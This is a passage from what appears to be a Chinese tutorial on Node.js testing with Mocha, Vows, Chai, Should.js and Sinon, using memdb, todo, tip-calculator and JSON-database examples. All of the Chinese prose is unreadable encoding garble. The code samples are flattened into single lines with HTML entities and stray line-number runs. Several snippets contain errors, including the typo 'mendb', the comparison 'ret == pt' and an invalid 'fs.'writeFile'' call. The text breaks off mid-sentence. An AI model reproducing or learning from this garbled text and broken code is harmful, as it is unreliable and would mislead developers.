memdb.saveSync(pet); const ret = memdb.first(&#123; name: 'Tobi' &#125;); assert(ret == pt); &#125;); &#125;);&#125;); æ·»åŠ  saveSync åŠŸèƒ½ 1234567891011121314const db = [];exports.saveSync = (doc) =&gt; &#123; db.push(doc);&#125;exports.first = (obj) =&gt; &#123; return db.filter(doc =&gt; &#123; for (let key in obj) &#123; if (doc[key] != obj[key]) &#123; return false; &#125; &#125; return true; &#125;).shift();&#125; describeå—è¢«ç§°ä¸ºæµ‹è¯•å¥—ä»¶ï¼Œè¡¨ç¤ºä¸€ç»„ç›¸å…³çš„æµ‹è¯•ï¼Œå®ƒæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æµ‹è¯•å¥—ä»¶çš„åç§°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå®žé™…æ‰§è¡Œçš„å‡½æ•°ã€‚ itå—è¢«ç§°ä¸ºæµ‹è¯•ç”¨ä¾‹ï¼Œè¡¨ç¤ºä¸€ä¸ªå•ç‹¬çš„æµ‹è¯•ï¼Œæ˜¯æµ‹è¯•çš„æœ€å°å•ä½ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æµ‹è¯•ç”¨ä¾‹çš„åå­—ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå®žé™…æ‰§è¡Œçš„å‡½æ•°ã€‚ æ‰€æœ‰çš„æµ‹è¯•ç”¨ä¾‹éƒ½åº”è¯¥å«æœ‰ä¸€å¥æˆ–å¤šå¥çš„æ–­è¨€ï¼Œå®ƒæ˜¯ç¼–å†™æµ‹è¯•ç”¨ä¾‹çš„å…³é”®ï¼Œæ–­è¨€åŠŸèƒ½ç”±æ–­è¨€åº“æ¥å®žçŽ°ã€‚ ç”¨ MochaæŒ‚é’©å®šä¹‰è®¾ç½®å’Œæ¸…ç†é€»è¾‘ BDD æŽ¥å£ beforeEach()ã€afterEach()ã€before()å’Œ after()æŽ¥å—å›žè°ƒï¼Œå¯ä»¥ç”¨æ¥å®šä¹‰è®¾ç½®å’Œæ¸…ç†é€»è¾‘ã€‚ 12345678910111213141516171819202122232425262728293031const memdb = require('..');const assert = require('assert');describe('memdb', () =&gt; &#123; beforeEach(() =&gt; &#123; memdb.clear(); &#125;); describe('.saveSync(doc)', () =&gt; &#123; it('should save the document', () =&gt; &#123; const pet = &#123; name: 'Tobi' &#125;; memdb.saveSync(pet); const ret = memdb.first(&#123; name: 'Tobi' &#125;); assert(ret == pet); &#125;); &#125;); describe('.first(obj)', () =&gt; &#123; it('should return the first matching doc', () =&gt; &#123; const tobi = &#123; name: 'Tobi' &#125;; const loki = &#123; name: 'Loki' &#125;; memdb.saveSync(tobi); memdb.saveSync(loki); let ret = mendb.first(&#123; name: 'Tobi' &#125;); assert(ret == tobi); ret = memdb.first(&#123; name: 'Loki' &#125;); assert(ret == loki); &#125;); &#125;); it('should return null when no doc matches', () =&gt; &#123; const ret = mendb.first(&#123; name: 'Manny' &#125;); assert(ret == null); &#125;);&#125;); ç†æƒ³çš„æƒ…å†µä¸‹ï¼Œæµ‹è¯•ç”¨ä¾‹ä¸ä¼šå…±äº«çŠ¶æ€ï¼Œè¦è®© memdb è¾¾åˆ°è¿™ä¸€çŠ¶æ€ï¼Œåªéœ€è¦åœ¨ index.js ä¸­å®žçŽ° .clear æ–¹æ³•æ¥ç§»é™¤æ‰€æœ‰çš„æ–‡æ¡£å°±å¯ä»¥äº†ã€‚ 123exports.clear = () =&gt; &#123; db.length = 0;&#125; æµ‹è¯•å¼‚æ­¥é€»è¾‘ ä¸ºäº†æ¼”ç¤ºå¼‚æ­¥æµ‹è¯•ï¼Œéœ€è¦åšä¸€äº›æ”¹åŠ¨ï¼Œå°† saveSync å‡½æ•°åŠ ä¸€ä¸ªä¼šåœ¨çŸ­æš‚å»¶è¿Ÿä¹‹åŽæ‰§è¡Œçš„å›žè°ƒï¼ˆç”¨æ¥æ¨¡æ‹ŸæŸä¸­å¼‚æ­¥æ“ä½œï¼‰ä½œä¸ºå¯é€‰çš„å‚æ•°ï¼š 12345678exports.saveSync = (doc, cb) =&gt; &#123; db.push(doc); if (cb) &#123; setTimeout(() =&gt; &#123; cb(); &#125;, 1000); &#125;&#125; åªè¦ç»™å®šä¹‰æµ‹è¯•é€»è¾‘å‡½æ•°æ·»åŠ ä¸€ä¸ªå‚æ•°ï¼Œå°±å¯ä»¥æŠŠ Mocha æµ‹è¯•ç”¨ä¾‹å®šä¹‰ä¸ºå¼‚æ­¥çš„ã€‚è¿™ä¸ªå‚æ•°é€šå¸¸è¢«å‘½åä¸º done,ä¸‹é¢çš„ä»£ç ä¸­æ¼”ç¤ºäº†å¦‚ä½•ç»™å¼‚æ­¥æ–¹æ³• .save() å†™æµ‹è¯•ç”¨ä¾‹ã€‚ 12345678910111213describe('asyncronous .saveSync(doc)', () =&gt; &#123; it('should save the document', (done) =&gt; &#123; // ä¿å­˜æ–‡æ¡£ const pet = &#123; name: 'Tobi' &#125;; memdb.saveSync(pet, () =&gt; &#123; // ç”¨ç¬¬ä¸€ä¸ªæ–‡æ¡£è°ƒç”¨å›žè°ƒ const ret = memdb.first(&#123; name: 'Tobi' &#125;); assert(ret == pet); // å‘Šè¯‰Mocha è¿™ä¸ªæµ‹è¯•ç”¨ä¾‹å®Œæˆäº† done(); &#125;); &#125;);&#125;); è¿™ä¸ªè§„åˆ™é€‚ç”¨äºŽæ‰€æœ‰æŒ‚é’©ï¼Œæ¯”å¦‚ç»™ beforeEach() æŒ‚é’©ä¸€ä¸ªæ¸…ç†æ•°æ®åº“çš„å›žè°ƒï¼ŒMocha å¯ä»¥ç­‰å®ƒè°ƒç”¨åŽå†ç»§ç»­ï¼Œå¦‚æžœè°ƒç”¨ done()æ—¶å®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸ªé”™è¯¯ï¼ŒMochaä¼šæŠ¥å‘Šè¿™ä¸ªé”™è¯¯ï¼Œå¹¶å°†è¿™ä¸ªæŒ‚é’©æˆ–æµ‹è¯•ç”¨ä¾‹æ ‡è®°ä¸ºå¤±è´¥ï¼š 123beforeEach((done) =&gt; &#123; memdb.clear(done);&#125;); Mocha çš„éžå¹¶è¡Œæµ‹è¯• Mochaçš„æµ‹è¯•ä¸æ˜¯å¹¶è¡Œæµ‹è¯•çš„ï¼Œè€Œæ˜¯ä¸€ä¸ªæŽ¥ä¸€ä¸ªåœ°æµ‹è¯•ï¼Œè™½ç„¶è¿™æ ·æ‰§è¡Œæ…¢ï¼Œä½†å†™èµ·æ¥æ›´å®¹æ˜“ã€‚Mochaä¸ä¼šè®©æµ‹è¯•è¿è¡Œå¤ªé•¿æ—¶é—´ï¼Œä¸€ä¸ªæµ‹è¯•é»˜è®¤ä¸è¶…è¿‡ 2000æ¯«ç§’ï¼Œè¶…è¿‡è¿™ä¸ªæ—¶é•¿ä¼šè¢«å½“åšå¤±è´¥çš„æµ‹è¯•ã€‚å¦‚æžœæœ‰è¿è¡Œæ—¶é—´é•¿çš„æµ‹è¯•ï¼Œå¯ä»¥ç”¨ â€“timeout æŒ‡å®šä¸€ä¸ªæ›´å¤§çš„æ•°å€¼ã€‚ ä¸è¿‡è¯´åˆ°å¹¶è¡Œçš„æ‰§è¡Œæµ‹è¯•çš„æ¡†æž¶æœ‰ä¸€ä¸ªå«åš Vowsçš„ã€‚ Vowsè·Ÿå¾ˆå¤šå•å…ƒæµ‹è¯•æ¡†æž¶æ¯”ï¼Œåœ¨Vows ä¸‹å†™çš„æµ‹è¯•ä»£ç ç»“æž„æ›´åŠ å¼ºï¼ŒVowsæƒ³è®©æµ‹è¯•æ›´å®¹æ˜“ç†è§£å’Œç»´æŠ¤ã€‚ Vows ç”¨å®ƒè‡ªå·±çš„BDD å±žäºŽå®šä¹‰æµ‹è¯•ç»“æž„ã€‚æŒ‰Vows çš„å®šä¹‰ï¼Œä¸€ä¸ªæµ‹è¯•å¥—ä»¶ä¸­åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæ‰¹æ¬¡ã€‚å¯ä»¥æŠŠæ‰¹æ¬¡å½“åšæ˜¯ä¸€ç»„ç›¸äº’å…³è”çš„æƒ…å¢ƒï¼Œæˆ–è€…è¦æµ‹è¯•çš„æ¦‚å¿µé¢†åŸŸã€‚æ‰¹æ¬¡å’Œä¸Šä¸‹æ–‡æ˜¯å¹¶è¡Œè¿è¡Œçš„ã€‚ä¸Šä¸‹æ–‡ä¸­å¯èƒ½åŒ…å«ä¸»é¢˜ã€ä¸€ä¸ªæˆ–å¤šä¸ªèª“çº¦ï¼Œä»¥åŠ/æˆ–è€…ä¸€æˆ–å¤šä¸ªå…ˆå…³è”çš„æƒ…å¢ƒï¼ˆå†…éƒ¨æƒ…å†µä¹Ÿæ˜¯å¹¶è¡Œè¿è¡Œçš„ï¼‰ã€‚ä¸»é¢˜æ˜¯è·Ÿæƒ…å¢ƒç›¸å…³çš„æµ‹è¯•é€»è¾‘ã€‚èª“çº¦æ˜¯å¯¹ä¸»é¢˜ç»“æžœçš„æµ‹è¯•ã€‚ 123å¥—ä»¶---æ‰¹æ¬¡---æƒ…å¢ƒ-----ä¸»é¢˜ |----èª“çº¦ |----æƒ…å¢ƒ Vows è·Ÿ Mocha ä¸€æ ·ï¼Œæ˜¯ä¸“é—¨ç”¨æ¥åšè‡ªåŠ¨åŒ–ç¨‹åºæµ‹è¯•çš„ã€‚å®ƒä»¬çš„å·®åˆ«ä¸»è¦ä½“çŽ°åœ¨é£Žæ ¼å’Œå¹¶è¡Œæ€§ä¸Šï¼ŒVows æµ‹è¯•æœ‰ç‰¹å®šçš„ç»“æž„å’Œæœ¯è¯­ã€‚ å…ˆåˆå§‹åŒ–,å¹¶å®‰è£…ä¾èµ– 12npm init -ynpm i -S -g vows ä¿®æ”¹ package.json testå±žæ€§ 123"scripts": &#123; "test": "vows test/*.js"&#125; ç”¨ Vows æµ‹è¯•ç¨‹åºé€»è¾‘ åœ¨ Vows ä¸­ï¼Œæ—¢å¯ä»¥è¿è¡ŒåŒ…å«æµ‹è¯•é€»è¾‘çš„è„šæœ¬æ¥è§¦å‘æµ‹è¯•ï¼Œä¹Ÿå¯ä»¥ç”¨ vows å‘½ä»¤è¡Œæµ‹è¯•è¿è¡Œå™¨ã€‚ä¸‹é¢è¿™ä¸ªä¾‹å­æ˜¯ä¸ªç‹¬ç«‹çš„æµ‹è¯•è„šæœ¬ï¼Œç”¨äº†å¾…åŠžäº‹é¡¹ç¨‹åºæ ¸å¿ƒé€»è¾‘æµ‹è¯•ä¸­çš„ä¸€ä¸ªã€‚ ä¸‹é¢çš„ä»£ç åˆ›å»ºä¸€ä¸ªæ‰¹æ¬¡ï¼Œåœ¨è¿™ä¸ªæ‰¹æ¬¡ä¸­å®šä¹‰äº†ä¸€ä¸ªæƒ…æ™¯ï¼Œæƒ…æ™¯ä¸­å®šä¹‰äº†ä¸€ä¸ªä¸»é¢˜å’Œä¸€ä¸ªèª“çº¦ã€‚æ³¨æ„å®ƒåœ¨ä¸»é¢˜å¦‚ä½•ä½¿ç”¨å›žè°ƒå¤„ç†ä¸€èˆ¬é€»è¾‘ï¼Œå¦‚æžœä¸»é¢˜ä¸æ˜¯å¼‚æ­¥çš„ï¼Œå¯ä»¥ç›´æŽ¥è¿”å›žå€¼ï¼Œä¸ç”¨é€šè¿‡å›žè°ƒã€‚ 1234567891011121314151617181920// test/todo-test.jsconst vows = require('vows');const assert = require('assert');const Todo = require('../todo');// æ‰¹æ¬¡vows.describe('Todo').addBatch(&#123; // æƒ…æ™¯ 'when adding an item': &#123; // ä¸»é¢˜ topic: () =&gt; &#123; const todo = new Todo(); todo.add('Feed my cat'); return todo; &#125;, // èª“çº¦ 'it should exist in my todos': (er, todo) =&gt; &#123; assert.equal(todo.length, 1); &#125; &#125;&#125;).export(module); 12345678910111213141516171819202122232425// todo.jsclass Todo &#123; constructor() &#123; this.todos = []; &#125; add(item) &#123; if (!item) throw new Error('Todo.prototype.add requires an item'); this.todos.push(item); &#125; deleteAll() &#123; this.todos = []; &#125; get length() &#123; return this.todos.length; &#125; doAsync(cb) &#123; setTimeout(cb, 2000, true); &#125;&#125;module.exports = Todo; Vows æä¾›äº†å®Œå¤‡çš„æµ‹è¯•æ–¹æ¡ˆï¼Œä½†ä»ç„¶å¯ä»¥ç”¨åˆ«çš„æ–­è¨€åº“å°†ä¸åŒæµ‹è¯•åº“çš„åŠŸèƒ½æ··åˆæ­é…åˆ°ä¸€èµ·.å¦å¤–è¿˜æœ‰ä¸€ä¸ªå«åš Chaiçš„æ–­è¨€åº“ï¼Œå®ƒå¯ä»¥ä»£æ›¿ assert æ¨¡å—ã€‚ ChaiChai æ˜¯ä¸ªæµè¡Œçš„æ–­è¨€åº“ï¼Œæœ‰ä¸‰ä¸ªæŽ¥å£ï¼šshouldã€expect å’Œ assertã€‚ä¸‹é¢çš„ä»£ç ä¸­ç”¨åˆ°äº† assert ï¼Œå…¶çœ‹èµ·æ¥å°±åƒæ˜¯ Node è‡ªå¸¦çš„ assertion æ¨¡å—ï¼Œä½†å®ƒè¿˜æœ‰ç”¨æ¥æ¯”è¾ƒå¯¹è±¡ã€æ•°ç»„å’Œå®ƒä»¬çš„å±žæ€§çš„å·¥å…·ã€‚æ¯”å¦‚ç”¨ typeofæ¯”è¾ƒç±»åž‹ï¼Œç”¨ propertyæ£€æŸ¥æŸä¸ªå¯¹è±¡æ˜¯å¦æœ‰æˆ‘ä»¬æƒ³è¦çš„å±žæ€§ã€‚ 123456789const chai = require('chai');const assert = chai.assert;const foo = 'bar';const tea = &#123; flavors: ['char', 'earl grey', 'pg tips'] &#125;;assert.typeOf(foo, 'string');assert.equal(foo, 'bar');assert.lengthOf(foo, 3);assert.property(tea, 'flavors');assert.lengthOf(tea.flavors, 3); è¿™ä¸ª API çœ‹èµ·æ¥æ›´åƒæ˜¯è‹±è¯­å¥å­â€”â€”å£°æ˜Žå¼é£Žæ ¼æ›´å†—é•¿ï¼Œä½†çœ‹èµ·æ¥æ›´åŠ é€šé¡ºã€‚should æ¢äº†ç§é£Žæ ¼ï¼šç»™å¯¹è±¡æ·»åŠ å±žæ€§ï¼Œè¿™æ ·å°±ä¸ç”¨æŠŠæ–­è¨€æ”¾åœ¨ expect è°ƒç”¨é‡Œäº† 12345const chai = require('chai');chai.should();const foo = 'bar';foo.should.be.a('string');foo.should.equal('bar'); è¦ç”¨å“ªä¸ªæŽ¥å£å–å†³äºŽé¡¹ç›®ï¼Œå¦‚æžœå…ˆå†™æµ‹è¯•ï¼Œå¹¶å°†å…¶ä½œä¸ºé¡¹ç›®çš„æ–‡æ¡£ï¼Œè¯¦ç»†çš„ expect å’Œ should æŽ¥å£å¾ˆå¥½ç”¨ã€‚ Chai æœ‰å¾ˆå¤šæ’ä»¶ï¼ŒåŒ…æ‹¬ä¸€äº›è¶æ‰‹çš„å·¥å…·ï¼Œæ¯”å¦‚å¯ä»¥ç”¨ promise å†™æµ‹è¯•ä»£ç çš„ chai-as-promisedï¼Œä»¥åŠæ ¹æ®ç»Ÿè®¡æ–¹æ³•æ¯”è¾ƒæ•°å€¼çš„ chai-statsã€‚æ³¨æ„ï¼Œå› ä¸º Chai æ˜¯æ–­è¨€åº“ï¼Œæ‰€ä»¥è¦è·Ÿ Mocha è¿™æ ·çš„æµ‹è¯•è¿è¡Œè€…é…åˆä½¿ç”¨ã€‚å¦ä¸€ä¸ªåƒ Chai ä¸€æ ·çš„ BDD æ–­è¨€åº“æ˜¯ Should.jsã€‚ Should.jsShould.js æ˜¯ä¸ªæ–­è¨€åº“ï¼Œå®ƒç”¨ç±»ä¼¼äºŽ BDD çš„é£Žæ ¼è¡¨ç¤ºæ–­è¨€ï¼Œè®©æµ‹è¯•æ›´å®¹æ˜“çœ‹æ‡‚ã€‚å®ƒçš„è®¾è®¡åˆè¡·æ˜¯æ­é…å…¶ä»–æµ‹è¯•æ¡†æž¶ä¸€èµ·ç”¨ï¼Œæˆ‘ä»¬ç”¨çš„ä¾‹å­æ˜¯ç¼–å†™ä»£ç æµ‹è¯•ä¸€ä¸ªå®šåˆ¶çš„æ¨¡å—ã€‚Should.js è·Ÿå…¶ä»–æ¡†æž¶çš„æ­é…å¾ˆå®¹æ˜“ï¼Œå› ä¸ºå®ƒåªæ˜¯ç»™ Object.prototype å¢žåŠ äº†ä¸€ä¸ª shouldå±žæ€§ã€‚è¿™æ ·ä½ å°±å¯ä»¥å†™å‡ºè¡¨è¾¾èƒ½åŠ›æ›´å¼ºçš„æ–­è¨€ï¼Œæ¯”å¦‚ user.role.should.equal(â€˜adminâ€™)ï¼Œæˆ–è€… users.should.include(â€˜rickâ€™)ã€‚ æ¯”å¦‚è¯´ï¼Œä½ è¦ç¼–å†™ä¸€ä¸ª Node å‘½ä»¤è¡Œçš„å°è´¹è®¡ç®—å™¨ï¼Œåœ¨ä½ è·Ÿæœ‹å‹ä»¬é‡‡ç”¨ AA åˆ¶ä»˜è´¹æ—¶ï¼Œè¦ç”¨å®ƒè®¡ç®—æ¯ä¸ªäººè¯¥ä»˜å¤šå°‘é’±ã€‚ä½ å¸Œæœ›éžç¨‹åºå‘˜æœ‹å‹ä¹Ÿèƒ½çœ‹æ‡‚æµ‹è¯•è®¡ç®—é€»è¾‘çš„ä»£ç ï¼Œä»¥å…ä»–ä»¬æ€€ç–‘ä½ è€è¯ˆã€‚ åˆå§‹åŒ–å¹¶å®‰è£…ä¾èµ– 12npm init -ynpm i --save-dev should æ–°å»ºå¹¶ç¼–è¾‘ index.js ï¼Œæ”¾å…¥å®žçŽ°æ ¸å¿ƒåŠŸèƒ½çš„ä»£ç ï¼Œå…·ä½“æ¥è¯´ï¼Œæ¶ˆè´¹è®¡ç®—å™¨åŒ…å«å››ä¸ªè¾…åŠ©å‡½æ•°ï¼š addPercentageToEachâ€”â€”æŒ‰ç»™å®šçš„ç™¾åˆ†æ¯”åŠ å¤§æ•°ç»„ä¸­çš„æ‰€æœ‰æ•°å€¼ sumâ€”â€”è®¡ç®—æ•°ç»„ä¸­æ‰€æœ‰æ•°å€¼çš„å’Œ percentFormatâ€”â€”å°†è¦æ˜¾ç¤ºçš„å€¼å˜æˆç™¾åˆ†æ¯”æ ¼å¼ dollarFormatâ€”â€”å°†è¦æ˜¾ç¤ºçš„å€¼å˜æˆç¾Žå…ƒæ ¼å¼ åˆ†è´¦æ—¶è®¡ç®—å°è´¹çš„é€»è¾‘ 12345678910111213141516171819202122232425// index.js// æŒ‰ç™¾åˆ†æ¯”åŠ å¤§æ•°ç»„å…ƒç´ æ±‡æ€»çš„æ•°å€¼exports.addPercentageToEach = (prices, percentage) =&gt; &#123; return prices.map(total =&gt; &#123; total = parseFloat(total); return total + (total * percentage) &#125;);&#125;// è®¡ç®—æ•°ç»„ä¸­æ‰€æœ‰æ•°å€¼çš„å’Œexports.sum = (prices) =&gt; &#123; return prices.reduce((currentSum, currentValue) =&gt; &#123; return parseFloat(currentSum) + parseFloat(currentValue); &#125;)&#125;// å°†è¦æ˜¾ç¤ºçš„å€¼å˜æˆç™¾åˆ†æ¯”æ ¼å¼exports.percentFormat = (percentage) =&gt; &#123; return parseFloat(percentage) * 100 + '%';&#125;//å°†è¦æ˜¾ç¤ºçš„å€¼å˜æˆç¾Žå…ƒæ ¼å¼exports.dollarFormat = (number) =&gt; &#123; return `$$&#123;parseFloat(number).toFixed(2)&#125;`;&#125; åˆ†è´¦æ—¶æµ‹è¯•è®¡ç®—å°è´¹çš„é€»è¾‘ 12345678910111213141516171819// test/tips.jsconst tips = require('..');const should = require('should');const tax = 0.12;const tip = 0.15;const prices = [10, 20];const pricesWithTipAndTax = tips.addPercentageToEach(prices, tip + tax);pricesWithTipAndTax[0].should.equal(12.7);pricesWithTipAndTax[1].should.equal(25.4);const totalAmount = tips.sum(pricesWithTipAndTax).toFixed(2);totalAmount.should.equal('38.10');const totalAmountAsCurrency = tips.dollarFormat(totalAmount);totalAmountAsCurrency.should.equal('$38.10');const tipAsPercent = tips.percentFormat(tip);tipAsPercent.should.equal('15%'); ä¿®æ”¹ package.json ä¸­çš„è„šæœ¬ 123"scripts": &#123; "test": "node test/tips.js"&#125; è¿è¡Œè„šæœ¬ï¼Œnpm test å¦‚æžœä¸€åˆ‡æ­£å¸¸ï¼Œä¸ä¼šè¾“å‡ºä»€ä¹ˆã€‚å› ä¸ºæ–­è¨€æ²¡æœ‰æŠ›å‡ºé”™è¯¯ã€‚ Should.js æ”¯æŒå¾ˆå¤šç§æ–­è¨€ï¼Œä»Žä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼çš„åˆ°æ£€æŸ¥å¯¹è±¡å±žæ€§çš„å…¨éƒ½æœ‰ï¼Œå…¶å¯ä»¥å¯¹ç¨‹åºç”Ÿæˆçš„æ•°æ®å’Œå¯¹è±¡è¿›è¡Œå…¨é¢çš„æ£€æŸ¥ã€‚å¤„ç†æ–­è¨€åº“ï¼Œæµ‹è¯•æ—¶è¿˜ç»å¸¸è¦ç”¨åˆ°æŽ¢æµ‹å™¨ã€å­˜æ ¹å’Œæ¨¡æ‹Ÿå¯¹è±¡ã€‚ Sinon.JS çš„æŽ¢æµ‹å™¨å’Œå­˜æ ¹æ¨¡æ‹Ÿå¯¹è±¡å’Œå­˜æ ¹åº“æ˜¯æµ‹è¯•å·¥å…·ç®±é‡Œçš„å·¥å…·ã€‚æˆ‘ä»¬å†™å•å…ƒæµ‹è¯•æ˜¯ä¸ºäº†æŠŠç³»ç»Ÿçš„å„ä¸ªç»„æˆéƒ¨åˆ†éš”ç¦»å•ç‹¬æµ‹è¯•ï¼Œä½†æœ‰æ—¶å€™è¿™å¾ˆéš¾åšåˆ°ã€‚æ¯”å¦‚æµ‹è¯•å›¾ç‰‡ç¼©æ”¾çš„ä»£ç æ—¶ï¼Œå¦‚æžœä¸æƒ³è¯»å†™çœŸæ­£çš„å›¾ç‰‡æ–‡ä»¶ï¼Œè¯¥æ€Žä¹ˆå†™æµ‹è¯•ä»£ç ï¼Œä»£ç ä¸­ä¸åº”è¯¥æœ‰é¿å¼€æ–‡ä»¶ç³»ç»Ÿè¯»å†™çš„ç‰¹æ®Šæµ‹è¯•åˆ†æ”¯ï¼Œå› ä¸ºé‚£æ ·å°±ä¸æ˜¯çœŸæ­£çš„æµ‹è¯•äº†ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œéœ€è¦åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿçš„åŠŸèƒ½çš„å­˜æ ¹ã€‚å¯ä»¥ç”¨å­˜æ ¹æ¥ä»£æ›¿å°šæœªå‡†å¤‡å¥½çš„ä¾èµ–é¡¹ï¼Œè¿™æœ‰åŠ©äºŽå®žçŽ°çœŸæ­£çš„ TDDã€‚ ä¸‹é¢ä»‹ç»å¦‚ä½• ç”¨ SinonJS ç¼–å†™æµ‹è¯•æŽ¢æµ‹å™¨ã€å­˜æ ¹å’Œæ¨¡æ‹Ÿå¯¹è±¡ã€‚ åˆå§‹åŒ–ï¼Œå®‰è£…ä¾èµ– 12npm init -ynpm i --save-dev sinon æŽ¥ç€åˆ›å»ºè¦æµ‹è¯•çš„æ ·ä¾‹æ–‡ä»¶ï¼Œè¿™ä¸ªä¾‹å­é‡Œç”¨äº†ä¸€ä¸ªç®€å•çš„ JSON é”®/å€¼æ•°æ®åº“ï¼Œåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ API çš„å­˜æ ¹ï¼Œè¿™æ ·å°±ä¸ç”¨åœ¨æ–‡ä»¶ç³»ç»Ÿé‡Œåˆ›å»ºçœŸæ­£çš„æ–‡ä»¶äº†ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥åƒä¸‹é¢ä¸€æ ·åªæµ‹è¯•æ•°æ®åº“ä»£ç ï¼Œé¿å…å¤„ç†æ–‡ä»¶çš„ä»£ç  123456789101112131415// db.jsconst fs = require('fs');class Database &#123; constructor(filename) &#123; this.filename = filename; this.data = &#123;&#125;; &#125; save(cb) &#123; fs.writeFile(this.filename, JSON.stringify(this.data), cb); &#125; insert(key, value) &#123; this.data[key] = value; &#125;&#125;module.exports = Database; æŽ¢æµ‹å™¨ æœ‰æ—¶å€™æˆ‘ä»¬åªæƒ³çœ‹çœ‹æŸä¸ªæ–¹æ³•æ˜¯å¦è°ƒç”¨äº†ï¼ŒæŽ¢æµ‹å™¨æœ€é€‚åˆåšè¿™ä¸ªï¼Œå€ŸåŠ©å®ƒçš„ API ï¼Œå¯ä»¥å°†æŸä¸ªæ–¹æ³•æ›¿æ¢æˆèƒ½å¤Ÿè¿›è¡Œæ–­è¨€çš„ä¸œè¥¿ã€‚æ¯”å¦‚ç”¨ Sinon çš„æ–¹æ³•æ›¿èº« spy æ¨¡æ‹Ÿ db.js ä¸­çš„ fs.writeFile: 1sinon.spy(fs.'writeFile'); æµ‹è¯•å®ŒæˆåŽï¼Œå¯ä»¥ç”¨ fs.writeFile.restore() å¤åŽŸåŽŸæ¥çš„æ–¹æ³•ã€‚ åœ¨ Mocha ä¹‹ç±»çš„æµ‹è¯•åº“ä¸­ä½¿ç”¨æ—¶ï¼Œåº”è¯¥æŠŠè¿™äº›æ“ä½œæ”¾åœ¨ beforeEach å’Œ afterEach ä¸­ï¼Œä¸‹é¢æ˜¯æŽ¢æµ‹å™¨ç”¨æ³•çš„å®Œæ•´ä¾‹å­ 1234567891011121314151617// spies.jsconst sinon = require('sinon');const Database = require('./db');const fs = require('fs');const database = new Database('./sample.json');// âžŠ æ›¿æ¢fs æ–¹æ³•const fsWriteFileSpy = sinon.spy(fs,'writeFile');const saveDone = sinon.spy();database.insert('name','Charles Dickens');database.save(saveDone);// âž‹ æ–­è¨€ writeFile åªè°ƒç”¨ä¸€æ¬¡sinon.assert.calledOnce(fsWriteFileSpy);// âžŒ æ¢å¤åŽŸæ¥çš„æ–¹æ³•fs.writeFile.restore(); è®¾ç½®å¥½æŽ¢æµ‹å™¨åŽâžŠè¿è¡Œè¦æµ‹è¯•çš„ä»£ç ã€‚ç„¶åŽè°ƒç”¨ sinon.assertâž‹ç¡®ä¿æ–¹æ³•è¢«è°ƒç”¨äº†ã€‚æ¢å¤åŽŸæ¥çš„æ–¹æ³•âžŒã€‚è¿™é¡¹æµ‹è¯•ä¸­çš„æ¢å¤æ“ä½œä¸æ˜¯å¿…é¡»çš„ï¼Œä½†æ¢å¤ä¹‹å‰æ”¹å˜çš„æ–¹æ³•æ˜¯æœ€ä½³å®žè·µã€‚ å­˜æ ¹ æœ‰æ—¶å€™è¦æŽ§åˆ¶ä»£ç æµç¨‹ï¼Œæ¯”å¦‚åœ¨æµ‹è¯•é”™è¯¯å¤„ç†ä»£ç æ—¶ï¼Œéœ€è¦å¼ºåˆ¶æ‰§è¡Œé”™è¯¯å¤„ç†åˆ†æ”¯ã€‚å¯ä»¥ç”¨å‰é¢çš„ä¾‹å­æ”¹å†™ï¼Œç”¨å­˜æ ¹å–ä»£æŽ¢æµ‹å™¨ï¼Œä»¥ä¾¿æ‰§è¡Œ writeFile çš„å›žè°ƒå‡½æ•°ã€‚æ³¨æ„ï¼Œæˆ‘ä»¬å¹¶ä¸æ˜¯æƒ³è°ƒç”¨çœŸæ­£çš„ writeFile.åªæ˜¯å¸Œæœ›èƒ½è¿è¡Œé‚£ä¸ªå›žè°ƒå‡½æ•°ã€‚ä¸‹é¢çš„æ˜¯ä¾‹å­ã€‚ 12345678910111213141516171819202122// stub.jsconst sinon = require('sinon');const Database = require('./db');const fs = require('fs');const database = new Database('./sample.json');// ç”¨è‡ªå·±çš„å‡½æ•°æ›¿ä»£ writeFileconst stub = sinon.stub(fs,'writeFile',(file,data,cb)=&gt;&#123; cb();&#125;);const saveDone = sinon.spy();database.insert('name','Charles Dickens');database.save(saveDone);// æ–­è¨€ writeFile è¢«è°ƒç”¨äº†sinon.assert.calledOnce(stub);// æ–­è¨€ database.save çš„å›žè°ƒè¢«è°ƒç”¨äº†sinon.assert.calledOnce(saveDone);fs.writeFile.restore(); åœ¨æµ‹è¯•æœ‰å¤§é‡ç”¨æˆ·æä¾›çš„å‡½æ•°ã€å›žè°ƒå’Œ promise çš„ä»£ç æ—¶ï¼ŒæŠŠå­˜æ ¹å’ŒæŽ¢æµ‹å™¨ç»“åˆèµ·æ¥ç”¨æ˜¯æœ€ç†æƒ³çš„åŠžæ³•ã€‚çœ‹è¿‡è¿™äº›å•å…ƒæµ‹è¯•å·¥å…·åŽï¼Œæˆ‘ä»¬è¯¥åŽ»æŽ¢ç©¶å¦ä¸€ç§é£Žæ ¼çš„æµ‹è¯•äº†ï¼šåŠŸèƒ½æµ‹è¯•ã€‚ åŠŸèƒ½æµ‹è¯•åœ¨å¤§å¤šæ•° Web é¡¹ç›®çš„å¼€å‘ä¸­ï¼Œè¿›è¡ŒåŠŸèƒ½æµ‹è¯•çš„åŠžæ³•éƒ½æ˜¯æŒ‰ç”¨æˆ·æŒ‡å®šçš„éœ€æ±‚åˆ—è¡¨é©±åŠ¨æµè§ˆå™¨æ‰§è¡Œæ“ä½œï¼Œç„¶åŽæ£€æŸ¥å„ç§ DOM å˜åŒ–ã€‚æ¯”å¦‚åœ¨åšä¸€ä¸ªå†…å®¹ç®¡ç†ç³»ç»Ÿæ—¶ï¼Œè¦å¯¹å›¾ç‰‡åº“çš„ä¸Šä¼ åŠŸèƒ½åšåŠŸèƒ½æµ‹è¯•ï¼Œä¹Ÿå°±æ˜¯ä¸Šä¼ ä¸€å¼ 